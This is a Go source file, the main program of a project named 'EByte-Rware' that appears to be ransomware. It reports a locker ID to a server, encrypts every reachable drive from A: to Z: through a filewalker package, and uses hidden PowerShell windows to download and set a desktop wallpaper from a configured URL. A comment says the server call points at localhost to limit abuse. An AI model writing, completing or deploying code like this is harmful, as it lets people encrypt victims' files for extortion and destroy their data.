package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"syscall"
	"path/filepath"
	"time"

	Configuration "EByte-Rware/configuration"
	"EByte-Rware/filewalker"
)

const EbyteLocker = "%BYTELOCKER_KEY_HERE%"

func main() {
	sendLockerID(EbyteLocker)

	for _, drive := range getDrives() {
		filewalker.EncryptDirectory(drive + ":\\")
	}

	setWallpaper()
}

func sendLockerID(lockerID string) {
	data := map[string]string{
		"locker_id": lockerID,
		"timestamp": time.Now().Format(time.RFC3339),
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Printf("Error marshaling data: %v\n", err)
		return
	}
    // for local testing, you dont need more than that lol. im minimizng risks of this being heavily abused
	resp, err := http.Post("http://localhost:8080/launch", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Printf("Error sending locker ID: %v\n", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		fmt.Println("Locker ID sent successfully!")
	} else {
		fmt.Printf("Failed to send locker ID. Status: %d\n", resp.StatusCode)
	}
}

func setWallpaper() {
	filePath := filepath.Join(os.Getenv("TEMP"), "Wallpaper.png")

	downloadCmd := exec.Command("powershell", "-Command", `(New-Object System.Net.WebClient).DownloadFile('`+Configuration.WallpaperURL+`', '`+filePath+`')`)
	downloadCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := downloadCmd.Run()
	if err != nil {
		return
	}

	setWallpaperCmd := exec.Command("powershell", "-Command", `Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport("user32.dll", CharSet = CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); public static void Set(string path) { SystemParametersInfo(20, 0, path, 3); } }'; [Wallpaper]::Set('`+filePath+`')`)
	setWallpaperCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err = setWallpaperCmd.Run()
	if err != nil {
		return
	}
}

func getDrives() (r []string) {
	for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
		f, err := os.Open(string(drive) + ":\\")
		if err == nil {
			r = append(r, string(drive))
			f.Close()
		}
	}
	return
}
